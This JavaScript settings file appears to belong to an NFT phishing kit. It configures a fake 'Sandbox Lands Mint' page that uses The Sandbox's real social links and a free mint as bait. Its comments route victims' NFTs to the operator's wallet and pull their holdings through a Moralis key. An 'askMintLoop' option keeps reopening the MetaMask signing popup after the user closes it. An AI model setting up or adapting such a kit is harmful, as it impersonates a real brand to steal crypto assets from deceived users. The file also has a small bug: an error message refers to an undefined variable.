const address = "YOUR WALLET";    // Your wallet that you have to receive NFTs
const infuraId = "API KEY"     // Infuria ID | https://infura.io/ | For Wallet Connect
const moralisApi = "X-API-KEY"    // x-api-key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "Sandbox Lands Mint",
    title: "Sandbox Land", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "25.06.2022",
    socialMedia: {
        discord: "https://discord.gg/thesandboxgame",
        twitter: "https://twitter.com/TheSandboxGame",
    },
    medias: {
        preview: "b.jpg",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0,         // Price per NFT.
    totalSupply: 489,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 1,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}


/* 
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
